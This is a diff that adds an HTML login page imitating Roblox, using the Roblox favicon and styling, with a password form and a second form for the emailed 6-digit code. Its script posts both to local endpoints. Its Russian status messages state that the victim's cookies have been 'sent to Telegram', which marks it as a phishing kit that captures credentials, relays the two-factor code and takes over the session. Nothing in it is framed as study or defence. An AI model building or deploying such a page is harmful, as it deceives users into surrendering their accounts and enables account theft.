@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log In</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico">
+    <style>
+        body { background: #232527; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body class="rbx-body dark-theme builder-font">
+    <div class="container-main">
+        <div class="login-form-container">
+            <form class="login-form" id="loginForm">
+                <div class="form-group username-form-group">
+                    <label for="login-username" class="sr-only">Username/Email/Phone</label>
+                    <input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="Username/Email/Phone" required>
+                </div>
+                <div class="form-group password-form-group">
+                    <label for="login-password" class="sr-only">Password</label>
+                    <input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" required>
+                </div>
+                <div class="form-group remember-me-form-group">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Remember me</label>
+                </div>
+                <button type="submit" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button>
+            </form>
+            <form class="login-form hidden" id="codeForm">
+                <div class="form-group">
+                    <label for="code-input">Enter the code from your email</label>
+                    <input id="code-input" name="code" type="text" class="form-control input-field" maxlength="6" placeholder="6-digit code" required>
+                </div>
+                <button type="submit" id="code-button" class="btn-full-width login-button btn-secondary-md">Submit Code</button>
+            </form>
+            <div class="text-center forgot-credentials-link">
+                <a id="forgot-credentials-link" class="text-link" href="#">Forgot password or username?</a>
+            </div>
+            <div class="text-center signup-link">
+                <span>Don't have an account?</span> <a href="#" class="text-link">Sign Up</a>
+            </div>
+            <div id="result" class="result-message"></div>
+        </div>
+    </div>
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        var loginForm = document.getElementById('loginForm');
+        var codeForm = document.getElementById('codeForm');
+        var resultDiv = document.getElementById('result');
+        var sessionId = null;
+
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            resultDiv.style.display = 'none';
+            var username = document.getElementById('login-username').value;
+            var password = document.getElementById('login-password').value;
+            var remember = document.getElementById('remember').checked;
+            fetch('/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({username, password, remember})
+            }).then(res => res.json()).then(data => {
+                if (data.need_code) {
+                    sessionId = data.session_id;
+                    loginForm.classList.add('hidden');
+                    codeForm.classList.remove('hidden');
+                    resultDiv.style.display = 'block';
+                    resultDiv.textContent = 'Введите код из почты Roblox.';
+                    resultDiv.className = 'result-message';
+                } else if (data.success) {
+                    resultDiv.style.display = 'block';
+                    resultDiv.textContent = 'Успешно! Куки отправлены в Telegram.';
+                    resultDiv.className = 'result-message success';
+                    loginForm.reset();
+                } else {
+                    resultDiv.style.display = 'block';
+                    resultDiv.textContent = data.message || 'Ошибка!';
+                    resultDiv.className = 'result-message error';
+                }
+            }).catch(() => {
+                resultDiv.style.display = 'block';
+                resultDiv.textContent = 'Ошибка соединения!';
+                resultDiv.className = 'result-message error';
+            });
+        });
+
+        codeForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            resultDiv.style.display = 'none';
+            var code = document.getElementById('code-input').value;
+            if (!sessionId) {
+                resultDiv.style.display = 'block';
+                resultDiv.textContent = 'Нет session_id. Попробуйте войти заново.';
+                resultDiv.className = 'result-message error';
+                return;
+            }
+            fetch('/submit_code', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({session_id: sessionId, code: code})
+            }).then(res => res.json()).then(data => {
+                if (data.success) {
+                    resultDiv.style.display = 'block';
+                    resultDiv.textContent = 'Вход завершён! Куки отправлены в Telegram.';
+                    resultDiv.className = 'result-message success';
+                    codeForm.reset();
+                    codeForm.classList.add('hidden');
+                } else {
+                    resultDiv.style.display = 'block';
+                    resultDiv.textContent = data.message || 'Ошибка!';
+                    resultDiv.className = 'result-message error';
+                }
+            }).catch(() => {
+                resultDiv.style.display = 'block';
+                resultDiv.textContent = 'Ошибка соединения!';
+                resultDiv.className = 'result-message error';
+            });
+        });
+    });
+    </script>
+</body>
+</html> 
